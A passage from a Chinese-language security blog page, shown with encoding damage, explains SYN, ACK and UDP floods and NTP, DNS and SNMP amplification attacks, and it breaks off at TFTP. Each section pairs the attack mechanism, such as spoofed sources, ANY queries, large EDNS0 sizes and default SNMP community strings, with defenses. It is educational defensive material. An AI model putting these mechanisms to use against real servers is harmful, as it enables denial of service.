flood attack (å‡ ä¸ªå€¼å¾—äº†è§£çš„å…³é”®ç‚¹æ¥äº†)"></a>SYN flood attack (å‡ ä¸ªå€¼å¾—äº†è§£çš„å…³é”®ç‚¹æ¥äº†)</h2><p><code>SYN flood attack</code> æ˜¯åœ¨TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ä¸­äº§ç”Ÿçš„ã€‚æ”»å‡»è€…é€šè¿‡å‘é€å¤§é‡ä¼ªé€ çš„å¸¦æœ‰<font color="6495ED">SYNæ ‡å¿—ä½çš„TCPæŠ¥æ–‡</font>ï¼Œä¸ç›®æ ‡ä¸»æœºå»ºç«‹äº†å¾ˆå¤šè™šå‡çš„<strong>åŠå¼€è¿æ¥</strong>ï¼Œåœ¨æœåŠ¡å™¨è¿”å›<font color="6495ED">SYN+ACKæ•°æ®åŒ…</font>åï¼Œæ”»å‡»è€…ä¸å¯¹å…¶åšå‡ºå“åº”ï¼Œä¹Ÿå°±æ˜¯ä¸è¿”å›ACKæ•°æ®åŒ…ç»™æœåŠ¡å™¨ï¼Œè¿™æ ·æœåŠ¡å™¨å°±ä¼šä¸€ç›´ç­‰å¾…ç›´åˆ°è¶…æ—¶ã€‚è¿™ç§æ”»å‡»æ–¹å¼ä¼šä½¿ç›®æ ‡æœåŠ¡å™¨è¿æ¥èµ„æºè€—å°½ã€é“¾è·¯å µå¡ï¼Œä»è€Œè¾¾åˆ°æ‹’ç»æœåŠ¡çš„ç›®çš„ã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" data-fancybox="group" data-caption="ddos_6" class="fancybox"><img alt="ddos_6" title="ddos_6" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_6.jpg" class="lazyload"></a></p><p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>:</p><ul><li><p><font color="6495ED">SYN Check</font>ï¼šä½¿ç”¨é˜²æŠ¤è®¾å¤‡ï¼Œ<strong>3æ¬¡æ¡æ‰‹å˜æˆäº†6æ¬¡æ¡æ‰‹</strong>ï¼Œç”±é˜²æŠ¤è®¾å¤‡æ£€æµ‹SYNè¯·æ±‚æ˜¯å¦åˆæ³•ï¼Œé€šè¿‡åå†ç”±é˜²æŠ¤è®¾å¤‡å°†æŠ¥æ–‡è½¬å‘ç»™æœåŠ¡å™¨ï¼Œåç»­æŠ¥æ–‡ä»ç”±é˜²æŠ¤è®¾å¤‡ä»£ç†ã€‚</p></li><li><p><font color="6495ED">Micro blocks</font>ï¼šç®¡ç†å‘˜å¯ä»¥åœ¨å†…å­˜ä¸­<strong>ä¸ºæ¯ä¸ªSYNè¯·æ±‚åˆ›å»ºä¸€ä¸ªå°ç´¢å¼•(å°äº16å­—èŠ‚)</strong>ï¼Œè€Œä¸å¿…æŠŠæ•´ä¸ªè¿æ¥å¯¹è±¡å­˜å…¥å†…å­˜ã€‚</p></li><li><p><font color="6495ED">RST cookies</font>ï¼šåœ¨å®¢æˆ·ç«¯å‘èµ·ç¬¬ä¸€ä¸ªSYNè¯·æ±‚åï¼ŒæœåŠ¡å™¨æ•…æ„å›åº”ä¸€ä¸ªé”™è¯¯çš„SYN+ACKæŠ¥æ–‡ã€‚å¦‚æœåˆæ³•ç”¨æˆ·æ”¶åˆ°è¿™ä¸ªæŠ¥æ–‡ï¼Œå°±ä¼šç»™æœåŠ¡å™¨å“åº”RSTæŠ¥æ–‡ã€‚å½“æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªæŠ¥æ–‡æ—¶ï¼Œå°±å°†è¿™ä¸ªä¸»æœºçš„IPè®°å½•è¿›åˆæ³•IPåˆ—è¡¨ï¼Œä¸‹æ¬¡è¯¥ä¸»æœºå‘èµ·SYNè¯·æ±‚æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥é€šè¿‡äº†ã€‚</p></li><li><p><font color="6495ED">STACK tweaking</font>ï¼šç®¡ç†å‘˜å¯ä»¥è°ƒæ•´TCPå †æ ˆä»¥å‡ç¼“SYNæ³›æ´ªæ”»å‡»çš„å½±å“ã€‚è¿™åŒ…æ‹¬<strong>å‡å°è¶…æ—¶æ—¶é—´</strong>ï¼Œ<strong>ç­‰åˆ°å †æ ˆå­˜é‡Šå†…æ”¾æ—¶å†åˆ†é…è¿æ¥</strong>ï¼Œå¦åˆ™å°±éšæœºæ€§åœ°åˆ é™¤ä¼ å…¥çš„è¿æ¥ã€‚</p></li></ul><h2 id="ACK-Flood-Attack"><a href="#ACK-Flood-Attack" class="headerlink" title="ACK Flood Attack"></a>ACK Flood Attack</h2><p><code>ACK Flood Attack</code> æ˜¯åˆ©ç”¨TCPä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ã€‚è¿™é‡Œå¯ä»¥åˆ†ä¸ºä¸¤ç§ã€‚</p><h3 id="ç¬¬ä¸€ç§"><a href="#ç¬¬ä¸€ç§" class="headerlink" title="ç¬¬ä¸€ç§"></a>ç¬¬ä¸€ç§</h3><p><strong>æ”»å‡»è€…</strong>ä¼ªé€ å¤§é‡çš„ <code>SYN+ACKåŒ…</code> å‘é€ç»™ç›®æ ‡ä¸»æœºï¼Œç›®æ ‡ä¸»æœºæ¯æ”¶åˆ°ä¸€ä¸ª <code>SYN+ACKæ•°æ®åŒ…</code> æ—¶ï¼Œéƒ½ä¼šå»<strong>è‡ªå·±çš„TCPè¿æ¥è¡¨ä¸­æŸ¥çœ‹æœ‰æ²¡æœ‰ä¸ACKçš„å‘é€è€…å»ºç«‹è¿æ¥</strong> ï¼Œ<strong>å¦‚æœæœ‰åˆ™å‘é€ACKåŒ…å®ŒæˆTCPè¿æ¥ï¼Œå¦‚æœæ²¡æœ‰åˆ™å‘é€ ACK+RST æ–­å¼€è¿æ¥</strong>ã€‚ä½†æ˜¯åœ¨æŸ¥è¯¢è¿‡ç¨‹ä¸­ä¼šæ¶ˆè€—ä¸€å®šçš„CUPè®¡ç®—èµ„æºã€‚å¦‚æœç¬é—´æ”¶åˆ°å¤§é‡çš„SYN+ACKæ•°æ®åŒ…ï¼Œå°†ä¼šæ¶ˆè€—æœåŠ¡å™¨çš„å¤§é‡cpuèµ„æºï¼Œå¯¼è‡´<font color="6495ED">æ­£å¸¸çš„è¿æ¥æ— æ³•å»ºç«‹æˆ–å¢åŠ å»¶è¿Ÿï¼Œç”šè‡³é€ æˆæœåŠ¡å™¨ç˜«ç—ªã€æ­»æœºã€‚</font></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" data-fancybox="group" data-caption="ddos_7" class="fancybox"><img alt="ddos_7" title="ddos_7" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_7.png" class="lazyload"></a></p><h3 id="ç¬¬äºŒç§"><a href="#ç¬¬äºŒç§" class="headerlink" title="ç¬¬äºŒç§"></a>ç¬¬äºŒç§</h3><p><strong>åˆ©ç”¨TCPä¸‰æ¬¡æ¡æ‰‹çš„ACK+SYNåº”ç­”</strong>ï¼Œæ”»å‡»è€…å‘ä¸åŒçš„æœåŠ¡å™¨å‘é€å¤§é‡çš„SYNè¯·æ±‚ï¼Œè¿™äº›SYNè¯·æ±‚æ•°æ®åŒ…çš„æºIPå‡ä¸ºå—å®³ä¸»æœºIPï¼Œè¿™æ ·å°±ä¼šæœ‰å¤§é‡çš„SYN+ACKåº”ç­”æ•°æ®åŒ…å‘å¾€å—å®³ä¸»æœºï¼Œä»è€Œå ç”¨ç›®æ ‡çš„ç½‘ç»œå¸¦å®½èµ„æºï¼Œå½¢æˆæ‹’ç»æœåŠ¡ã€‚</p><p>é€šå¸¸DDOSæ”»å‡»ä¼šå°†ACK floodä¸SYN floodç»“åˆåœ¨ä¸€èµ·ï¼Œä»è€Œæ‰©å¤§å¨åŠ›ã€‚<br><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>å¯å‚è€ƒå¦‚ä¸‹ï¼š</p><ul><li>é‡‡ç”¨CDNè¿›è¡Œæµé‡ç¨€é‡Šï¼›</li><li>é¿å…æœåŠ¡å™¨IPæš´éœ²åœ¨å…¬ç½‘ä¸Šï¼›</li><li>é€šè¿‡é™é€Ÿæˆ–åŠ¨æ€æŒ‡çº¹çš„æ–¹å¼ï¼›</li><li>åˆ©ç”¨å¯¹ç§°æ€§åˆ¤æ–­æ¥åˆ†æå‡ºæ˜¯å¦æœ‰æ”»å‡»å­˜åœ¨ï¼›</li><li>åœ¨è¿ç»­æ”¶åˆ°ç”¨æˆ·å‘é€çš„ACKåŒ…æ—¶ï¼Œä¸­æ–­å›è¯ï¼Œè®©å…¶é‡è¿ã€‚</li></ul><h2 id="UDP-FLood-Attack"><a href="#UDP-FLood-Attack" class="headerlink" title="UDP FLood Attack"></a>UDP FLood Attack</h2><p><code>UDP</code>ï¼ˆ<code>User Datagram Protocol</code>ï¼Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰ï¼Œæ˜¯ä¸€ç§<strong>æ— è¿æ¥å’Œæ— çŠ¶æ€çš„ç½‘ç»œåè®®</strong>ï¼ŒUDPä¸éœ€è¦åƒTCPé‚£æ ·è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹ï¼Œè¿è¡Œå¼€é”€ä½ï¼Œä¸éœ€è¦ç¡®è®¤æ•°æ®åŒ…æ˜¯å¦æˆåŠŸåˆ°è¾¾ç›®çš„åœ°ã€‚è¿™å°±é€ æˆUDPæ³›æ´ªæ”»å‡»ä¸ä½†æ•ˆç‡é«˜ï¼Œè€Œä¸”è¿˜å¯ä»¥åœ¨èµ„æºç›¸å¯¹è¾ƒå°‘çš„æƒ…å†µä¸‹æ‰§è¡Œã€‚<code>UDP FLood</code> å¯ä»¥ä½¿ç”¨å°æ•°æ®åŒ…(64å­—èŠ‚)è¿›è¡Œæ”»å‡»,ä¹Ÿå¯ä»¥ä½¿ç”¨å¤§æ•°æ®åŒ…(å¤§äº1500å­—èŠ‚,ä»¥å¤ªç½‘MTUä¸º1500å­—èŠ‚)è¿›è¡Œæ”»å‡»ã€‚å¤§é‡å°æ•°æ®åŒ…ä¼šå¢å¤§ç½‘ç»œè®¾å¤‡å¤„ç†æ•°æ®åŒ…çš„å‹åŠ›ï¼›è€Œå¯¹äºå¤§æ•°æ®åŒ…ï¼Œç½‘ç»œè®¾å¤‡éœ€è¦è¿›è¡Œåˆ†ç‰‡ã€é‡ç»„ï¼Œæœ€ç»ˆè¾¾åˆ°çš„æ•ˆæœå°±æ˜¯<strong>å ç”¨ç½‘ç»œä¼ è¾“æ¥å£çš„å¸¦å®½ã€ç½‘ç»œå µå¡ã€æœåŠ¡å™¨å“åº”æ…¢ç­‰ç­‰ã€‚</strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" data-fancybox="group" data-caption="ddos_8" class="fancybox"><img alt="ddos_8" title="ddos_8" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_8.png" class="lazyload"></a></p><p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p><ul><li>é™åˆ¶æ¯ç§’é’Ÿæ¥å—åˆ°çš„æµé‡(å¯èƒ½äº§ç”Ÿè¯¯åˆ¤)ï¼›</li><li>é€šè¿‡åŠ¨æ€æŒ‡çº¹å­¦ä¹ (éœ€è¦æ”»å‡»å‘ç”Ÿä¸€å®šæ—¶é—´)ï¼Œå°†éæ³•ç”¨æˆ·åŠ å…¥é»‘åå•ã€‚</li></ul><hr><h2 id="NTPæ”¾å¤§æ”»å‡»-åˆæ­¥åªä½œç‚¹äº†è§£"><a href="#NTPæ”¾å¤§æ”»å‡»-åˆæ­¥åªä½œç‚¹äº†è§£" class="headerlink" title="NTPæ”¾å¤§æ”»å‡»(åˆæ­¥åªä½œç‚¹äº†è§£)"></a>NTPæ”¾å¤§æ”»å‡»(åˆæ­¥åªä½œç‚¹äº†è§£)</h2><p><code>NTP</code> (<code>Network Time Protocol</code>ï¼Œç½‘ç»œæ—¶é—´åè®®)ï¼Œæ˜¯ç”¨æ¥ä½¿è®¡ç®—æœºç½‘ç»œæ—¶é—´åŒæ­¥åŒ–çš„ä¸€ç§åè®®ï¼Œå®ƒå¯ä»¥ä½¿è®¡ç®—æœºä¸æ—¶é’Ÿæºè¿›è¡ŒåŒæ­¥åŒ–å¹¶æä¾›é«˜ç²¾åº¦çš„æ—¶é—´æ ¡æ­£ï¼Œä½¿ç”¨ <code>UDP 123</code> ç«¯å£è¿›è¡Œé€šä¿¡ã€‚<br>é€šå¸¸åœ¨NTPæœåŠ¡å™¨ä¸Šä¼šæœ‰ä¸€äº›è°ƒè¯•æ¥å£ï¼Œè€Œ <strong>åˆ©ç”¨è¿™äº›æ¥å£ä¸­çš„monlistè¯·æ±‚ï¼Œå°±å¯è§¦å‘æ”¾å¤§æ”»å‡»ã€‚</strong> å½“<strong>ä¸»æœº</strong>å‘ <code>NTPæœåŠ¡å™¨</code> å‘é€ <strong>monlistæŸ¥è¯¢è¯·æ±‚</strong> æ—¶ï¼ŒNTPæœåŠ¡å™¨ä¼šå°†ä¸ä¹‹è¿›è¡Œæ—¶é—´åŒæ­¥çš„æœ€å600ä¸ªIPåœ°å€è¿”å›ã€‚æ‰€ä»¥æ”»å‡»è€…åªéœ€è¦å°†æºåœ°å€ä¼ªé€ ä¸ºå—å®³ä¸»æœºçš„IPï¼Œå‘NTPæœåŠ¡å™¨å‘é€ä¸€ä¸ªmonlistæŸ¥è¯¢è¯·æ±‚åŒ…ï¼Œå—å®³ä¸»æœºå°±ä¼šæ”¶åˆ°å¤§é‡çš„UDPå“åº”åŒ…ã€‚è¿™ç§æ”»å‡»åœ¨æ”¾å¤§æ”»å‡»é‡Œï¼Œå±å®³ç›¸å¯¹è¾ƒå¤§ã€‚</p><p>æ€»ç»“ä¸€ä¸‹è¿™ç§æ”»å‡»äº§ç”Ÿçš„åŸå› :</p><ul><li>è¯·æ±‚ä¸å“åº”æ•°æ®åŒ…ä¸ç­‰ä»·ï¼›</li><li>UDPåè®®çš„é€šä¿¡æ¨¡ç³Šæ€§ï¼ˆæ— æ•°æ®ä¼ è¾“ç¡®è®¤æœºåˆ¶ï¼‰ï¼›</li><li>NTPæœåŠ¡å™¨çš„æ— è®¤è¯æœºåˆ¶ã€‚</li></ul><p>å†æ¥è°ˆè°ˆ<strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p><ul><li>ä½¿ç”¨é˜² <code>DDoS</code> è®¾å¤‡è¿›è¡Œæ¸…æ´—ï¼›</li><li>åŠ å›ºå¹¶å‡çº§NTPæœåŠ¡å™¨ï¼›</li><li>åœ¨ç½‘ç»œå‡ºå£å°ç¦ <code>UDP 123</code> æ—¶é—´åŒæ­¥ç«¯å£ï¼›</li><li>é€šè¿‡ç½‘ç»œå±‚æˆ–è€…å€ŸåŠ©è¿è¥å•†å®æ–½ <code>ACL</code> æ¥é˜²å¾¡ï¼›</li><li>å…³é—­ç°åœ¨ <code>NTP</code> æœåŠ¡çš„ <code>monlist</code> åŠŸèƒ½ï¼Œåœ¨ <code>ntp.conf</code>é…ç½®æ–‡ä»¶ä¸­å¢åŠ <code>disable monitor</code> é€‰é¡¹ã€‚</li></ul><hr><h2 id="DNSæ”¾å¤§æ”»å‡»"><a href="#DNSæ”¾å¤§æ”»å‡»" class="headerlink" title="DNSæ”¾å¤§æ”»å‡»"></a>DNSæ”¾å¤§æ”»å‡»</h2><p>DNS(Domain Name Systemï¼ŒåŸŸåç³»ç»Ÿ)ï¼Œç”±äºä½¿ç”¨IPåœ°å€æ¥è®°å¿†å„ä¸ªç½‘ç«™æ¯”è¾ƒå›°éš¾ï¼Œæ‰€ä»¥å°±äº§ç”Ÿäº†ä½¿ç”¨ä¸»æœºåç§°æ¥è¡¨ç¤ºå¯¹åº”çš„æœåŠ¡å™¨ï¼Œä¸»æœºåç§°é€šè¿‡åŸŸåè§£æçš„è¿‡ç¨‹è½¬æ¢æˆIPåœ°å€ã€‚ä¸‹é¢æ¥çœ‹ä¸€ä¸‹DNSæŠ¥æ–‡æ ¼å¼ï¼Œä»¥ä¾¿äº†è§£æ”»å‡»å‘ç”Ÿåœ¨ä½•å¤„ã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" data-fancybox="group" data-caption="ddos_9" class="fancybox"><img alt="ddos_9" title="ddos_9" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_9.png" class="lazyload"></a></p><p><strong>æŠ¥æ–‡é¦–éƒ¨æ ¼å¼</strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" data-fancybox="group" data-caption="ddos_10" class="fancybox"><img alt="ddos_10" title="ddos_10" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_10.png" class="lazyload"></a></p><p>æŠ¥æ–‡é¦–éƒ¨å„å­—æ®µå«ä¹‰å¦‚ä¸‹ï¼Œå…¶ä¸­é«˜äº®æ˜¯æ”»å‡»ç‚¹ä¹‹ä¸€</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" data-fancybox="group" data-caption="ddos_11" class="fancybox"><img alt="ddos_11" title="ddos_11" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_11.png" class="lazyload"></a></p><p>ä¸‹é¢æ˜¯é—®é¢˜è®°å½•ä¸­æŸ¥è¯¢ç±»å‹å¯è®¾ç½®çš„å€¼ï¼Œå‘ç°æœ€åä¸€ä¸ªANYç±»å‹ä¼šè¯·æ±‚æ‰€æœ‰è®°å½•ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ”»å‡»ç‚¹</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" data-fancybox="group" data-caption="ddos_12" class="fancybox"><img alt="ddos_12" title="ddos_12" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_12.png" class="lazyload"></a></p><h3 id="DNSé€’å½’æŸ¥è¯¢"><a href="#DNSé€’å½’æŸ¥è¯¢" class="headerlink" title="DNSé€’å½’æŸ¥è¯¢"></a>DNSé€’å½’æŸ¥è¯¢</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" data-fancybox="group" data-caption="ddos_13" class="fancybox"><img alt="ddos_13" title="ddos_13" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_13.png" class="lazyload"></a></p><h3 id="DNSé€’å½’æŸ¥è¯¢-1"><a href="#DNSé€’å½’æŸ¥è¯¢-1" class="headerlink" title="DNSé€’å½’æŸ¥è¯¢"></a>DNSé€’å½’æŸ¥è¯¢</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" data-fancybox="group" data-caption="ddos_14" class="fancybox"><img alt="ddos_14" title="ddos_14" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_14.png" class="lazyload"></a></p><p>ä»DNSæ•°æ®åŒ…ç»“æ„ä»¥åŠDNSé€’å½’æŸ¥è¯¢è¿‡ç¨‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¤§è‡´åˆ†æå‡ºæ”»å‡»åŸç†ã€‚<br>é¦–å…ˆï¼Œæ”»å‡»è€…å‘ <strong>åƒµå°¸ç½‘ç»œ</strong> å‘å‡ºæŒ‡ä»¤ï¼Œä½¿åƒµå°¸ç½‘ç»œä¸­çš„æ¯ä¸€å°ä¸»æœºå‡å‘å‡ºä¸€ä¸ª <strong>ä¼ªé€ æºåœ°å€çš„DNSæŸ¥è¯¢è¯·æ±‚åŒ…</strong>ï¼Œè¿™äº›<strong>è¯·æ±‚åŒ…æŸ¥è¯¢ç±»å‹è®¾ç½®ä¸ºANY</strong>ï¼Œå› ä¸ºè¿™ç§ç±»å‹ä¼šè¯·æ±‚æ‰€æœ‰çš„è®°å½•ï¼Œè¿™äº›è®°å½•ä¼šåœ¨è¿”å›çš„å“åº”åŒ…ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ç§æ•°æ®åŒ…çš„å¤§å°è¾ƒå…¶ä»–ç±»å‹æ˜¯æœ€å¤§çš„ã€‚</p><p>æ¥ç€æŸ¥è¯¢ç±»å‹è®¾ä¸ºé€’å½’æŸ¥è¯¢ï¼Œä¸ºä»€ä¹ˆä¸æ˜¯è¿­ä»£æŸ¥è¯¢å‘¢ï¼Œä»”ç»†çœ‹ä¸¤ç§æŸ¥è¯¢çš„è¿‡ç¨‹å›¾å¯å‘ç°ï¼Œ<strong>å¦‚æœè¿­ä»£æŸ¥è¯¢ç¬¬ä¸€ä¸ªè¯·æ±‚çš„DNSæœåŠ¡å™¨æ²¡æœ‰æŸ¥è¯¢åˆ°ç»“æœ</strong>ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªè¯·æ±‚çš„æœåŠ¡å™¨ä¼šè¿”å›å¦ä¸€ä¸ªDNSæœåŠ¡å™¨IPï¼Œè®©è¯·æ±‚ä¸»æœºå‘è¿™ä¸ªIPå»ç»§ç»­æŸ¥è¯¢ï¼Œç„¶è€Œ <strong><font color="6495ED">æ”»å‡»è€…çš„æ•°æ®åŒ…æºåœ°å€æ˜¯ä¼ªé€ çš„ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šå‘èµ·ç¬¬äºŒæ¬¡æŸ¥è¯¢ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡æŸ¥è¯¢æ ¹æœ¬å°±ä¸æ˜¯å®ƒå‘èµ·çš„</font></strong>;</p><p>è€Œ<strong>é€’å½’æŸ¥è¯¢</strong>å´æ˜¯åœ¨æŸ¥è¯¢åˆ°ç»“æœä¹‹åï¼Œæ‰è¿”å›ç»™æŸ¥è¯¢è¯·æ±‚å‘èµ·è€…ã€‚<br>åˆ©ç”¨è¿™ä¸¤ä¸ªç‰¹ç‚¹ï¼Œæ”»å‡»è€…å°±å¯ä»¥æˆåŠŸå‘èµ·DNSæ”¾å¤§æ”»å‡»ã€‚<br>è¿™ç§æ™®é€šçš„æŸ¥è¯¢è¯·æ±‚å¯ä»¥<strong>å°†æ”»å‡»æµé‡æ”¾å¤§2~10å€</strong>ï¼Œå¦‚æœæƒ³å¢å¤§æ”»å‡»å€æ•°ï¼Œå¯ä»¥ä½¿ç”¨ <code>RFC 2671</code> ä¸­å®šä¹‰çš„DNSæ‹“å±•æœºåˆ¶EDNS0ã€‚æœªä½¿ç”¨EDNS0æ—¶ï¼Œè‹¥å“åº”åŒ…å¤§å°å°äº512å­—èŠ‚ï¼Œå°±ä½¿ç”¨UDPå°è£…æ•°æ®ï¼›è‹¥å“åº”åŒ…å¤§å°è¶…è¿‡512å­—èŠ‚ï¼Œå°±ä½¿ç”¨TCPè¿æ¥æˆ–è€…æœåŠ¡å™¨æˆªæ–­å“åº”æŠ¥æ–‡ï¼Œä¸¢å¼ƒè¶…è¿‡512å­—èŠ‚çš„éƒ¨åˆ†ï¼Œå¹¶æŠŠTCä½ç½®1ã€‚è¿™ä¸¤ç§æ–¹å¼éƒ½ä¸åˆ©äºè¿›è¡ŒDNSæ”¾å¤§æ”»å‡»ã€‚ç„¶è€Œåœ¨å¼€å¯EDNS0æœºåˆ¶åï¼Œå¢åŠ äº† <code>OPT RR</code> å­—æ®µï¼Œè¿™ä¸¤ä¸ªå­—æ®µåŒ…å«äº†èƒ½å¤Ÿå¤„ç†çš„æœ€å¤§UDPæŠ¥æ–‡å¤§å°ä¿¡æ¯ï¼Œæ‰€ä»¥æ”»å‡»è€…å°†è¿™ä¸ªä¿¡æ¯è®¾ç½®çš„å¾ˆå¤§ï¼ŒæœåŠ¡å™¨å°±ä¼šæ ¹æ®è¿™ä¸ªä¿¡æ¯ç”Ÿæˆå“åº”æŠ¥æ–‡ã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" data-fancybox="group" data-caption="ddos_15" class="fancybox"><img alt="ddos_15" title="ddos_15" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_15.png" class="lazyload"></a></p><p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p><ul><li>è”ç³» <code>ISP</code> æ¸…æ´—ä¸Šæ¸¸æµé‡ï¼›</li><li>DNSæœåŠ¡å™¨åªå¯¹å¯ä¿¡åŸŸå†…æä¾›æœåŠ¡ï¼Œé™åˆ¶å¯¹åŸŸå¤–ç”¨æˆ·æä¾›DNSè§£ææœåŠ¡ï¼›</li><li>å¯¹å•ä¸ªIPçš„æŸ¥è¯¢é€Ÿç‡åšé™åˆ¶ï¼›</li><li>æ‹¥æœ‰è¶³å¤Ÿçš„å¸¦å®½æ‰¿å—å°è§„æ¨¡æ”»å‡»ï¼›</li><li>å…³é—­DNSæœåŠ¡å™¨çš„é€’å½’æŸ¥è¯¢ï¼›</li><li>åˆ©ç”¨é˜²ç«å¢™ç­‰å¯¹ <code>ANY Request</code> è¿›è¡Œè¿‡æ»¤ã€‚</li></ul><hr><h2 id="SNMPæ”¾å¤§æ”»å‡»"><a href="#SNMPæ”¾å¤§æ”»å‡»" class="headerlink" title="SNMPæ”¾å¤§æ”»å‡»"></a>SNMPæ”¾å¤§æ”»å‡»</h2><p><code>SNMP</code> ( <code>Simple Network Management Protocol</code>ï¼Œç®€å•ç½‘ç»œç®¡ç†åè®®)ï¼Œæ˜¯ç›®å‰ç½‘ç»œä¸­åº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ç½‘ç»œç®¡ç†åè®®ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªç®¡ç†æ¡†æ¶æ¥ç›‘æ§å’Œç»´å’Œäº’è”ç½‘è®¾å¤‡ï¼Œå®ƒä½¿ç”¨UDP161ç«¯å£è¿›è¡Œé€šä¿¡ã€‚<font color="6495ED">æ”»å‡»è€…å‘äº’è”ç½‘ä¸Šå¼€å¯SNMPæœåŠ¡çš„è®¾å¤‡å‘é€GetBulkè¯·æ±‚ï¼Œå¹¶ä½¿ç”¨é»˜è®¤é€šä¿¡å­—ç¬¦ä¸²ä½œä¸ºè®¤è¯å‡­æ®ã€‚</font>å¸¸è§çš„é»˜è®¤é€šä¿¡å­—ç¬¦ä¸²å¦‚<code>public</code>ã€<code>private</code> ä»¥åŠä¸€äº›å‚å•†é»˜è®¤çš„é€šä¿¡å­—ç¬¦ä¸²ã€‚<strong>GetBulkè¯·æ±‚</strong>æ˜¯åœ¨<strong>SNMPv2</strong>ä¸­æ·»åŠ çš„ï¼Œè¯¥è¯·æ±‚ä¼šè®©SNMPè®¾å¤‡å°½å¯èƒ½å¤šçš„è¿”å›æ•°æ®ï¼Œè¿™ä¹Ÿå°±æ˜¯SNMPæ”¾å¤§æ”»å‡»çš„åˆ©ç”¨ç‚¹ã€‚</p><h3 id="ä¸‹é¢æ¥çœ‹ä¸€ä¸‹SNMPçš„PDUæ ¼å¼"><a href="#ä¸‹é¢æ¥çœ‹ä¸€ä¸‹SNMPçš„PDUæ ¼å¼" class="headerlink" title="ä¸‹é¢æ¥çœ‹ä¸€ä¸‹SNMPçš„PDUæ ¼å¼"></a>ä¸‹é¢æ¥çœ‹ä¸€ä¸‹SNMPçš„PDUæ ¼å¼</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" data-fancybox="group" data-caption="ddos_16" class="fancybox"><img alt="ddos_16" title="ddos_16" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_16.png" class="lazyload"></a></p><p>æ”»å‡»è€…å…ˆå°†æºåœ°å€æ”¹æˆè¦æ”»å‡»çš„ç›®æ ‡IPï¼Œå†ä½¿ç”¨é»˜è®¤çš„é€šä¿¡å­—ç¬¦ä¸²ï¼Œå‘å¤§é‡SNMPè®¾å¤‡å‘å‡ºGetBulkè¯·æ±‚ï¼Œè®¾å¤‡æ”¶åˆ°GetBulkè¯·æ±‚æ•°æ®åŒ…åï¼Œä¼šå°†ä¸€å¤§æ®µçš„è®¾å¤‡æ£€ç´¢ä¿¡æ¯è¿”å›ç»™ç›®æ ‡ä¸»æœºï¼Œæœ€ç»ˆç›®æ ‡ä¸»æœºä¼šè¢«è¿™äº›SNMPè®¾å¤‡è¿”å›çš„æ•°æ®åŒ…æ·¹æ²¡ï¼Œå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" data-fancybox="group" data-caption="ddos_17" class="fancybox"><img alt="ddos_17" title="ddos_17" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_17.png" class="lazyload"></a></p><p>é˜²æŠ¤æ–¹æ¡ˆï¼š</p><ul><li>ç¦æ­¢å·²å¼€å¯SNMPçš„è®¾å¤‡å“åº”GetBulkè¯·æ±‚ï¼Œé¿å…è‡ªå·±çš„è®¾å¤‡è¢«é»‘å®¢åˆ©ç”¨ï¼›</li><li>æ›´æ”¹é»˜è®¤çš„é€šä¿¡å­—ç¬¦ä¸²ï¼›</li><li>ä¿®æ”¹é»˜è®¤ç«¯å£161ï¼›</li><li>éšè—å¼€å¯SNMPè®¾å¤‡çš„å…¬ç½‘IP</li></ul><hr><h2 id="TFTPæ”¾å¤§æ”»å‡»"><a href="#TFTPæ”¾å¤§æ”»å‡»" class="headerlink" title="TFTPæ”¾å¤§æ”»å‡»"></a>TFTPæ”¾å¤§æ”»å‡»</h2><p><code>TFTP</code>ï¼ˆ<code>Trivial File Transfer Protocol</code>ï¼Œç®€å•æ–‡ä»¶ä¼ 